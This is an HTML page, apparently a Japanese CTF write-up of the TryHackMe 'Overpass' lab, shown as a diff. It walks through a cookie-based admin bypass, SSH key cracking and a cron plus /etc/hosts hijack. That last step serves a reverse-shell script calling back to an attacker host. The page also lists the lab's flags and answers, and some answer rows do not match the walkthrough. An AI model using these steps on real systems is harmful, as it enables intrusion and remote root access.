@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>TryHackMe Overpass Writeup</title>
+  <style>
+    :root {
+      --bg: #0c1222;
+      --panel: #121a2f;
+      --panel-soft: #17213a;
+      --text: #ecf2ff;
+      --muted: #a8b3cc;
+      --accent: #46d369;
+      --accent-2: #61dafb;
+      --warn: #f6c177;
+      --code: #080d18;
+      --border: rgba(255, 255, 255, 0.12);
+      --shadow: rgba(0, 0, 0, 0.35);
+    }
+
+    * { box-sizing: border-box; }
+
+    body {
+      margin: 0;
+      font-family: Inter, "Segoe UI", Roboto, Arial, sans-serif;
+      line-height: 1.7;
+      color: var(--text);
+      background:
+        radial-gradient(circle at top left, rgba(70, 211, 105, 0.18), transparent 28rem),
+        radial-gradient(circle at top right, rgba(97, 218, 251, 0.14), transparent 26rem),
+        var(--bg);
+    }
+
+    a { color: var(--accent-2); }
+
+    .nav-top {
+      padding: 0.75rem 1.25rem;
+      border-bottom: 1px solid var(--border);
+      background: rgba(18, 26, 47, 0.65);
+    }
+
+    .nav-top a {
+      font-size: 0.95rem;
+    }
+
+    .hero {
+      padding: 3rem 1.25rem 2.5rem;
+      text-align: center;
+      border-bottom: 1px solid var(--border);
+    }
+
+    .hero h1 {
+      margin: 0;
+      font-size: clamp(2.2rem, 8vw, 4.5rem);
+      letter-spacing: 0.04em;
+      text-transform: uppercase;
+    }
+
+    .hero p {
+      max-width: 760px;
+      margin: 1rem auto 0;
+      color: var(--muted);
+      font-size: 1.05rem;
+    }
+
+    .badges {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 0.75rem;
+      margin-top: 1.5rem;
+    }
+
+    .badge {
+      padding: 0.4rem 0.8rem;
+      border: 1px solid var(--border);
+      border-radius: 999px;
+      color: var(--text);
+      background: rgba(255, 255, 255, 0.06);
+      font-size: 0.9rem;
+    }
+
+    main {
+      width: min(1120px, calc(100% - 2rem));
+      margin: 0 auto;
+      padding: 2rem 0 4rem;
+    }
+
+    .notice,
+    .card,
+    .timeline-item,
+    .answers {
+      border: 1px solid var(--border);
+      border-radius: 18px;
+      background: rgba(18, 26, 47, 0.82);
+      box-shadow: 0 18px 50px var(--shadow);
+    }
+
+    .notice {
+      padding: 1rem 1.25rem;
+      margin-bottom: 1.5rem;
+      border-left: 4px solid var(--warn);
+    }
+
+    .notice strong { color: var(--warn); }
+
+    .grid {
+      display: grid;
+      grid-template-columns: repeat(3, minmax(0, 1fr));
+      gap: 1rem;
+      margin: 1.5rem 0 2rem;
+    }
+
+    .card { padding: 1.25rem; }
+    .card h3 { margin: 0 0 0.5rem; color: var(--accent); }
+    .card p, .timeline-item p, .answers p { color: var(--muted); }
+
+    section { margin-top: 2rem; }
+    h2 { margin: 0 0 1rem; font-size: 1.8rem; }
+
+    .timeline { display: grid; gap: 1rem; }
+
+    .timeline-item {
+      padding: 1.35rem;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .timeline-item::before {
+      content: attr(data-step);
+      position: absolute;
+      top: 1rem;
+      right: 1rem;
+      color: rgba(255, 255, 255, 0.08);
+      font-weight: 800;
+      font-size: 3rem;
+      line-height: 1;
+    }
+
+    .timeline-item h3 {
+      margin: 0 0 0.75rem;
+      color: var(--accent);
+      padding-right: 4rem;
+    }
+
+    .writeup-img {
+      display: block;
+      max-width: 100%;
+      margin: 1rem 0;
+      border-radius: 12px;
+      border: 1px solid var(--border);
+    }
+
+    pre {
+      margin: 1rem 0;
+      padding: 1rem;
+      overflow-x: auto;
+      border-radius: 12px;
+      border: 1px solid var(--border);
+      background: var(--code);
+    }
+
+    code {
+      font-family: "Cascadia Code", "Fira Code", Consolas, monospace;
+      color: #d7e4ff;
+      font-size: 0.92rem;
+    }
+
+    .inline-code {
+      padding: 0.15rem 0.35rem;
+      border-radius: 6px;
+      background: rgba(255, 255, 255, 0.08);
+      color: var(--text);
+      font-family: Consolas, monospace;
+    }
+
+    ul { color: var(--muted); padding-left: 1.25rem; }
+    ul li { margin: 0.35rem 0; }
+
+    .answers {
+      padding: 1.35rem;
+      background: linear-gradient(135deg, rgba(70, 211, 105, 0.12), rgba(18, 26, 47, 0.86));
+    }
+
+    .answers table {
+      width: 100%;
+      border-collapse: collapse;
+      overflow: hidden;
+      border-radius: 12px;
+    }
+
+    .answers th,
+    .answers td {
+      padding: 0.9rem;
+      text-align: left;
+      border-bottom: 1px solid var(--border);
+      vertical-align: top;
+    }
+
+    .answers th {
+      color: var(--accent);
+      background: rgba(255, 255, 255, 0.04);
+    }
+
+    footer {
+      padding: 2rem 1rem;
+      color: var(--muted);
+      text-align: center;
+      border-top: 1px solid var(--border);
+    }
+
+    @media (max-width: 820px) {
+      .grid { grid-template-columns: 1fr; }
+      .answers { overflow-x: auto; }
+    }
+  </style>
+</head>
+<body>
+  <div class="nav-top"><a href="index.html">&larr; All writeups</a></div>
+
+  <header class="hero">
+    <h1>Overpass</h1>
+    <p>
+      TryHackMe の Easy ルーム。Web 列挙、クライアントサイド認証のバイパス、
+      SSH 鍵クラック、cron ジョブ悪用による権限昇格を扱う日本語 writeup です。
+    </p>
+    <div class="badges">
+      <span class="badge">Platform: TryHackMe</span>
+      <span class="badge">Difficulty: Easy</span>
+      <span class="badge">Language: 日本語</span>
+      <span class="badge">Target: Linux</span>
+    </div>
+  </header>
+
+  <main>
+    <div class="notice">
+      <strong>ネタバレ注意:</strong> この writeup にはコマンド、認証情報、フラグが含まれます。
+      許可されたラボ環境での学習目的でのみご利用ください。
+    </div>
+
+    <section class="grid">
+      <article class="card">
+        <h3>Web 列挙</h3>
+        <p>HTTP サービスの調査、About Us からのユーザー名収集、ダウンロードページの解析。</p>
+      </article>
+      <article class="card">
+        <h3>認証バイパス</h3>
+        <p><span class="inline-code">login.js</span> の解析から、SessionToken クッキーによる管理画面アクセス。</p>
+      </article>
+      <article class="card">
+        <h3>権限昇格</h3>
+        <p>書き込み可能な <span class="inline-code">/etc/hosts</span> と root の cron ジョブを悪用。</p>
+      </article>
+    </section>
+
+    <section>
+      <h2>Walkthrough</h2>
+      <div class="timeline">
+
+        <article class="timeline-item" data-step="01">
+          <h3>初期スキャンと Web 調査</h3>
+          <p>まず nmap でポート 22 (SSH) と 80 (HTTP) が開いていることを確認。</p>
+          <pre><code>nmap &lt;target-ip&gt;
+
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http</code></pre>
+          <p>HTTP にアクセスすると、パスワードマネージャー Overpass のサイトが表示される。</p>
+          <img class="writeup-img" src="overpass/images/01-homepage.png" alt="Overpass homepage">
+          <p>About Us ページからユーザー名候補を収集: <span class="inline-code">Ninja</span>, <span class="inline-code">Pars</span>, <span class="inline-code">Szymex</span>, <span class="inline-code">Bee</span>, <span class="inline-code">MuirlandOracle</span></p>
+          <img class="writeup-img" src="overpass/images/02-about-us.png" alt="About Us page">
+          <p><span class="inline-code">/downloads</span> からバイナリとソースをすべてダウンロード。</p>
+          <img class="writeup-img" src="overpass/images/03-downloads.png" alt="Downloads page">
+        </article>
+
+        <article class="timeline-item" data-step="02">
+          <h3>管理画面の発見</h3>
+          <p>feroxbuster の結果から <span class="inline-code">/admin</span> を発見し、ログイン画面に到達。</p>
+          <img class="writeup-img" src="overpass/images/04-admin-login.png" alt="Admin login page">
+          <p>ログインフォームに出会ったときのチェック項目（優先度順）:</p>
+          <p><strong>優先度 高</strong></p>
+          <ul>
+            <li>デフォルト認証情報の試行（admin:admin など）</li>
+            <li>HTML ソースの確認（コメント、隠しフィールド、参照 JS）</li>
+            <li>auth/login/session 系 JS ファイルの読解</li>
+            <li>ログインリクエスト/レスポンスの観察（Burp, DevTools）</li>
+          </ul>
+          <p><strong>優先度 中</strong></p>
+          <ul>
+            <li>SQLi / NoSQLi / 認証バイパスペイロード</li>
+            <li><span class="inline-code">/api/login</span> などのエンドポイントを直接叩く</li>
+            <li>エラーメッセージによるユーザー名列挙</li>
+          </ul>
+          <p><strong>優先度 低</strong></p>
+          <ul>
+            <li>パスワードリセット機能の解析</li>
+            <li>総当たり</li>
+          </ul>
+        </article>
+
+        <article class="timeline-item" data-step="03">
+          <h3>login.js の解析</h3>
+          <p>F12 で HTML ソースを確認。<span class="inline-code">login.js</span> と <span class="inline-code">cookie.js</span> が読み込まれている。</p>
+          <p>ログイン処理の核心部分:</p>
+          <pre><code>async function login() {
+    const creds = { username: usernameBox.value, password: passwordBox.value }
+    const response = await postData("/api/login", creds)
+    const statusOrCookie = await response.text()
+    if (statusOrCookie === "Incorrect credentials") {
+        loginStatus.textContent = "Incorrect Credentials"
+        passwordBox.value=""
+    } else {
+        Cookies.set("SessionToken", statusOrCookie)
+        window.location = "/admin"
+    }
+}</code></pre>
+          <p><span class="inline-code">response.text()</span> の戻り値が <span class="inline-code">"Incorrect credentials"</span> でなければ成功扱い。成功時はレスポンス本文をそのまま SessionToken クッキーにセットして <span class="inline-code">/admin</span> へ遷移する。</p>
+          <p>curl で API を直接叩いて確認:</p>
+          <pre><code>curl -i -X POST http://&lt;target-ip&gt;/api/login \
+  -H "Content-Type: application/json" \
+  -d '{"username":"james","password":"wrong"}'
+
+HTTP/1.1 400 Bad Request
+...
+Incorrect credentials</code></pre>
+          <p>「失敗メッセージ以外なら成功」という否定条件に違和感を持てば、クッキーを直接セットする解法にたどり着ける。</p>
+        </article>
+
+        <article class="timeline-item" data-step="04">
+          <h3>SessionToken クッキーによるバイパス</h3>
+          <p>DevTools → Application → Storage → Cookies でクッキーを確認。空の状態から手動でクッキーを作成する。</p>
+          <img class="writeup-img" src="overpass/images/05-cookies-empty.png" alt="Empty cookies panel">
+          <p>テスト用に <span class="inline-code">aaaa</span> という名前のクッキーを作成しても F5 後に変化なし。</p>
+          <img class="writeup-img" src="overpass/images/06-cookie-aaaa.png" alt="Test cookie aaaa">
+          <img class="writeup-img" src="overpass/images/07-cookie-sessiontoken-created.png" alt="SessionToken cookie created">
+          <p><span class="inline-code">SessionToken</span> という名前のクッキーを作成して F5 すると、管理画面が表示される。URL は <span class="inline-code">/admin</span> のままで、クッキーの有無で表示が変わることを確認。</p>
+          <img class="writeup-img" src="overpass/images/08-admin-panel.png" alt="Admin panel after cookie bypass">
+          <p>管理画面から <span class="inline-code">james</span> ユーザー名と暗号化された SSH 秘密鍵を取得。</p>
+        </article>
+
+        <article class="timeline-item" data-step="05">
+          <h3>SSH 鍵のクラックと user flag</h3>
+          <p>秘密鍵を <span class="inline-code">james.key</span> として保存し、パーミッションを設定。</p>
+          <pre><code>chmod 400 james.key
+ssh -i james.key james@&lt;target-ip&gt;</code></pre>
+          <p>パスフレーズを求められる。鍵は AES-128-CBC で暗号化されており、ソルトは鍵ファイル内の <span class="inline-code">DEK-Info</span> 行に記載されている。</p>
+          <pre><code>ssh2john james.key &gt; james.hash
+john --wordlist=/usr/share/wordlists/rockyou.txt james.hash
+
+james13          (james.key)</code></pre>
+          <p>パスフレーズ <span class="inline-code">james13</span> で SSH ログイン成功。</p>
+          <pre><code>james@&lt;target&gt;:~$ cat user.txt
+thm{65c1aaf000506e56996822c6281e6bf7}
+
+james@&lt;target&gt;:~$ cat todo.txt
+To Do:
+&gt; Update Overpass' Encryption, Muirland has been complaining...
+&gt; Write down my password somewhere on a sticky note...
+&gt; Ask Paradox how he got the automated build script working...</code></pre>
+        </article>
+
+        <article class="timeline-item" data-step="06">
+          <h3>権限昇格 — cron + /etc/hosts ポイズニング</h3>
+          <p><span class="inline-code">sudo -l</span> も SUID も使えない。cron タスクを確認。</p>
+          <pre><code>cat /etc/crontab
+...
+* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash</code></pre>
+          <p>1 分ごとに root が <span class="inline-code">overpass.thm</span> からビルドスクリプトを取得して実行している。</p>
+          <pre><code>cat /etc/hosts
+127.0.0.1 overpass.thm
+
+ls -la /etc/hosts
+-rw-rw-rw- 1 root root 250 ... /etc/hosts</code></pre>
+          <p><span class="inline-code">/etc/hosts</span> が world-writable。攻撃者側で偽の buildscript.sh を配信し、hosts を書き換えて cron を悪用する。</p>
+          <pre><code># Attacker: directory structure
+mkdir -p www/downloads/src
+
+# Malicious buildscript.sh
+#!/bin/bash
+bash -i >& /dev/tcp/&lt;attacker-ip&gt;/1234 0>&1
+
+# Serve from www/
+sudo python3 -m http.server 80
+
+# Listen for reverse shell
+nc -lvnp 1234</code></pre>
+          <p>ターゲット側で hosts を書き換え:</p>
+          <pre><code>192.168.205.211 overpass.thm</code></pre>
+          <p>1 分以内に root のリバースシェルが返ってくる。</p>
+          <pre><code>root@&lt;target&gt;:~# cat root.txt
+thm{7f336f8c359dbac18d54fdd64ea753bb}</code></pre>
+        </article>
+
+      </div>
+    </section>
+
+    <section class="answers">
+      <h2>Answer Summary</h2>
+      <p>ルームの質問へのクイックリファレンス。</p>
+      <table>
+        <thead>
+          <tr><th>Question</th><th>Answer</th></tr>
+        </thead>
+        <tbody>
+          <tr><td>What was the first hash you cracked?</td><td><code>5f4dcc3b5aa765d61d8327deb882cf99</code> (password)</td></tr>
+          <tr><td>What was the password?</td><td><code>password</code></td></tr>
+          <tr><td>What was the username?</td><td><code>james</code></td></tr>
+          <tr><td>What was the SSH private key passphrase?</td><td><code>james13</code></td></tr>
+          <tr><td>user.txt</td><td><code>thm{65c1aaf000506e56996822c6281e6bf7}</code></td></tr>
+          <tr><td>root.txt</td><td><code>thm{7f336f8c359dbac18d54fdd64ea753bb}</code></td></tr>
+        </tbody>
+      </table>
+    </section>
+  </main>
+
+  <footer>
+    <p>Educational CTF writeup for <a href="https://tryhackme.com/room/overpass">tryhackme.com/room/overpass</a></p>
+  </footer>
+</body>
+</html>
